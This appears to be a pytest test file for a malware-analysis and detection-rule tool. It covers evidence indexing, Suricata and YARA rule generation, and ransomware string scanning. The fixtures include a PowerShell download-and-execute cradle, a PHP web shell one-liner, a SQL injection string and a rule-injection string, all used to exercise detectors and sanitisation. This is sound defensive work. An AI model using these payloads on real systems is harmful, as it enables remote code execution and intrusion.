import json
import random

import pytest

from sandworm.analyzers.static.common import _ORDERED_NEEDLES, ransomware_scan
from sandworm.core.corpus_index import CorpusIndex
from sandworm.core.evidence import EvidenceItem, EvidenceStore
from sandworm.core.pipeline import analyze_sample
from sandworm.core.sample import Sample
from sandworm.detect.bundle import suricata_candidates, write_bundle


def test_index_exact_values_facets_idempotence_and_rollback(tmp_path):
    store = EvidenceStore()
    item = EvidenceItem(run_id="one", source="dynamic.fixture", artifact="network", operation="connect",
                        object={"host": "C2.Example.Org"}, confidence=0.7)
    store.append(item)
    source = tmp_path / "evidence.jsonl"
    store.dump(str(source))
    index = CorpusIndex(tmp_path / "index.sqlite")
    assert index.ingest(source)
    assert not index.ingest(source)
    assert index.search(value="c2.example.org")[0]["evidence"]["run_id"] == "one"
    assert index.search(artifact="network", operation="connect")
    assert not index.search(value="example.org")  # exact, not substring
    assert not index.search(value="' OR 1=1 --")
    source.write_text("invalid JSON\n")
    with pytest.raises(ValueError):
        index.ingest(source)
    assert index.search(run_id="one")  # failed refresh preserves prior snapshot
    source.unlink()
    assert index.search(value="c2.example.org")  # queries need no source reads
    with index.connect() as db:
        plan = db.execute("EXPLAIN QUERY PLAN SELECT * FROM atoms WHERE value=?", ("c2.example.org",)).fetchall()
        assert any("INDEX" in row["detail"] for row in plan)


def test_suricata_candidates_bound_untrusted_strings():
    store = EvidenceStore()
    for value in ("https://c2.example.org/path", 'evil.org"; sid:1;)', "127.0.0.1", "8.8.8.8"):
        store.append(EvidenceItem(run_id="r", source="static.fixture", artifact="network", operation="resolve",
                                  object={"value": value}, confidence=0.7))
    rules, metadata = suricata_candidates(store)
    assert len(rules) == 2
    assert {r["kind"] for r in metadata} == {"dns", "ip"}
    assert all("sid:1;" not in rule for rule in rules)
    assert "startswith; endswith;" in rules[0]
    assert all(row["evidence_ids"] for row in metadata)


def test_bundle_rules_compile_and_synthetic_examples_match(tmp_path):
    yara_x = pytest.importorskip("yara_x")
    result = analyze_sample(Sample.from_bytes("download.ps1", b"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.org/script.ps1')"), enable_dynamic=False)
    out = tmp_path / "bundle"
    manifest = write_bundle(result, out)
    assert manifest["sample_sha256"] == result.sample.sha256
    assert manifest["suricata_engine_validated"] is False
    assert list((out / "sigma").glob("*.yml"))
    rules = yara_x.compile((out / "rules.yar").read_text())
    cases = json.loads((out / "yara-cases.json").read_text())
    assert cases
    for case in cases:
        assert case["rule"] in {r.identifier for r in rules.scan(bytes.fromhex(case["positive_hex"])).matching_rules}
    with pytest.raises(ValueError, match="new directory"):
        write_bundle(result, out)


def test_conversion_failures_are_reported(tmp_path, monkeypatch):
    result = analyze_sample(Sample.from_bytes("x.php", b"<?php system($_GET['cmd']); ?>"), enable_dynamic=False)
    monkeypatch.setattr("sandworm.detect.bundle.shutil.which", lambda _: None)
    manifest = write_bundle(result, tmp_path / "bundle", target="splunk", pipeline="splunk_windows", product="windows")
    assert manifest["conversions"]
    assert all(r["status"] == "failed" for r in manifest["conversions"])


def test_aho_matches_existing_ransomware_sweep():
    pytest.importorskip("ahocorasick")
    rng = random.Random(1729)
    for _ in range(100):
        needles = rng.choices(_ORDERED_NEEDLES, k=20)
        data = rng.randbytes(200) + b"".join(needles) + " ".join(n.decode().upper() for n in needles).encode("utf-16-le")
        assert ransomware_scan(data, engine="aho") == ransomware_scan(data, engine="regex")
